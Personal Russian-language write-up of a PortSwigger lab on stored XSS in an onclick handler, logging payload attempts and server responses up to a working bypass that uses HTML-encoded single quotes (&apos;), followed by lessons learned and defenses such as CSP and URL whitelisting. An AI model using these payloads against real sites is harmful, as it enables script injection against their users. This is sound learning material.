### Использование HTML-кодирования
можно обходить проверки сивловов html путем кодирования 
пример вот оригин запрос
`<a href="#" onclick="... var input='controllable data here'; ...">`
++ сервер блокирует одинар кавычки

вот так можно обойти это
`&apos;-alert(document.domain)-&apos;`
&apos;  это та самая кавычка '

---
лаба https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
#### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
задание:
в коментах оставить пейлоад который вызывает алерт при клике на имя автора

----

оставил коммент  c именем MYname
вставляется между тегами < p>
имя не кликабельное..
```html
<section class="comment">
     <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">                    MYname | 24 February 2026
                        </p>
                        <p>fsrfwerf</p>
     <p></p>
</section>
```


нужно сделать имя кликабельным и чтобы аллерт вызывался!
```html
<section class="comment">
  <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">
    <a href="javascript:alert(1337)">MYname</a> | 24 February 2026
  </p>
  <p>fsrfwerf</p>
  <p></p>
</section>
```


пейлоад`<a href="javascript:alert(1337)">MYname</a>`
ответ
```html
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">                         &lt;a href=&quot;javascript:alert(1337)&quot;&gt;MYname&lt;/a&gt; | 24 February 2026
</p>
```

углов < >  скобки закодировались в &lt;   и &gt;
кавы "   закодировались в &quot;

ситуация противоположная тому, что было в описании лабы..

----

пейлоад`%3Ca href=&quot;javascript:alert(1337)&quot;&gt;MYname%3C/a&gt;`
ответ
```html
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">                            %3Ca href=&amp;quot;javascript:alert(1337)&amp;quot;&amp;gt;MYname%3C/a&amp;gt; 
| 24 February 2026
</p>
```

а вот символы / \ ; - и { } не кодируются

нужно как-то выйти из тега < p> не используя угловые скобки, но сервер кодирует их, значит нужно пробовать подставлять пейлоад напрямую  - внутри атрибута

и я ваще сделаю поле кликабельным? если нельзя добавлять новые теги/атриьбуты..

кликабельным должно быть поле где указывается веб сайт


----------

да - поле с сайтом гликабельное!! 
пейлоад http://google.com
ответ ```
```html
 <a id="author" href="http://google.com" onclick="var tracker={track(){}};tracker.track('http://google.com');">
```
здесь видно как подставляется пейлоад и оборачивается в " кавы двойные " 

----

http://google.com
-alert(1)- вот эти дефисы это аналог ;

пейлоад http://foo?"-alert("7777")-"
ответ 
```html
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://foo?&quot;-alert(&quot;7777&quot;)-&quot;" onclick="var tracker={track(){}};tracker.track('http://foo?&quot;-alert(&quot;7777&quot;)-&quot;');">zheka</a> | 24 February 2026
</p>
```
нужно закрыть "" , но кавычка кодируется

------


пейлоад http://foo?'-alert(1)-'
ответ
```html
                       <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://foo?\'-alert(1)-\'" onclick="var tracker={track(){}};tracker.track('http://foo?\'-alert(1)-\'');">42r</a> | 24 February 2026
                        </p>
```
  ' кавычки экранируются \

-------

поэтому я экранирую их экранирование 
пейлоад http://foo?\'-alert(1)-'
ответ
```html
                       <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://foo?\\\'-alert(1)-\'" onclick="var tracker={track(){}};tracker.track('http://foo?\\\'-alert(1)-\'');">zheka</a> | 24 February 2026
                        </p>
```
но сервер в ответ экранировал мое экранирование (которым я экранировал его экранирование моей кавычки ))) епта!


поменяю кавычки на кодированные через html

# пейлоад http://foo?\&apos;-alert(1)-&apos;

## слава богам! лаба решена!!
браузер парсил из кодирования html в символы!!!!!

браузер декодировал http://foo?\&apos;-alert(1)-&apos;
в http://foo?\'-alert(1)-'
и пейлоад сработал!

------

#### выводы по лабе:

1. двойные кавычки кодируются в " и бесполезны
   
2. ддинарные кавычки экранируются слешем, превращаясь в '

3. слеши которыми я экранирую - тоже экранируются 

4. HTML-сущность ' проходит мимо серверного экранирования и декодируется браузером обратно в '
   
5. пейлоад http://foo?&apos;-alert(1)-'&apos;     работает, так как ' закрывает строку в onclick, а -alert(1)- выполняется

#### защита:

1. не экранировать вручную, а использовать функции типа json_encode для вставки данных в JavaScript
   
2. применять Content Security Policy с запретом на инлайн-скрипты
   
3. для ссылок использовать строгую валидацию по белому списку (только http/https и без javascript:)
   
4. не доверять пользовательскому вводу и кодировать все спецсимволы под контекст, включая &, <, >, ", ', /

-----



